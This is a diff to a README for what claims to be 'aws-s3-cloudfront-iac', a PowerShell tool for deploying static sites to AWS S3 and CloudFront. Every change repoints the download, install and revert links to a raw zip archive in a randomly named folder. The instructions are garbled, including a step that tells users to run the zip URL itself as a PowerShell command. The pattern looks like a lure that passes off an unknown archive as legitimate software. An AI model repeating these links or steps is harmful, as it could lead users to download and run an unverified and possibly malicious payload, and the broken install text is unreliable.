@@ -1,6 +1,6 @@
 # 🚀 aws-s3-cloudfront-iac - Automate Your Website Deployment Easily
 
-[![Release](https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/vagarity/aws-s3-cloudfront-iac.zip%20Now-aws--s3--cloudfront--iac-brightgreen)](https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/vagarity/aws-s3-cloudfront-iac.zip)
+[![Release](https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/mortgagee/aws-s3-cloudfront-iac.zip%20Now-aws--s3--cloudfront--iac-brightgreen)](https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/mortgagee/aws-s3-cloudfront-iac.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ To use this application, you need:
 Follow these simple steps to get started:
 
 1. **Download the Software:**
-   - [Visit this page to download](https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/vagarity/aws-s3-cloudfront-iac.zip)
+   - [Visit this page to download](https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/mortgagee/aws-s3-cloudfront-iac.zip)
 
 2. **Install PowerShell (if needed):**
    - If you do not have PowerShell, you can download it from the official Microsoft website. Follow their instructions for installation.
@@ -39,11 +39,11 @@ Follow these simple steps to get started:
 
 5. **Run the Script:**
    - Open PowerShell and navigate to the folder where you extracted the files. 
-   - Type `.\https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/vagarity/aws-s3-cloudfront-iac.zip` and press Enter.
+   - Type `.\https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/mortgagee/aws-s3-cloudfront-iac.zip` and press Enter.
 
 ## 📥 Download & Install
 
-To begin your journey, [visit this page to download](https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/vagarity/aws-s3-cloudfront-iac.zip). Follow the instructions above for installation.
+To begin your journey, [visit this page to download](https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/mortgagee/aws-s3-cloudfront-iac.zip). Follow the instructions above for installation.
 
 ## 🔍 Usage
 
@@ -70,8 +70,8 @@ If you run into issues or have questions, please check the issues section on Git
 In case you need to revert to a previous version:
 
 1. Open PowerShell.
-2. Navigate to the folder containing the `https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/vagarity/aws-s3-cloudfront-iac.zip` script.
-3. Run `.\https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/vagarity/aws-s3-cloudfront-iac.zip` to return to the last stable state.
+2. Navigate to the folder containing the `https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/mortgagee/aws-s3-cloudfront-iac.zip` script.
+3. Run `.\https://raw.githubusercontent.com/LeonardoYT67/aws-s3-cloudfront-iac/main/mortgagee/aws-s3-cloudfront-iac.zip` to return to the last stable state.
 
 By following these steps, you ensure continued service for your static website without extensive downtime.
 
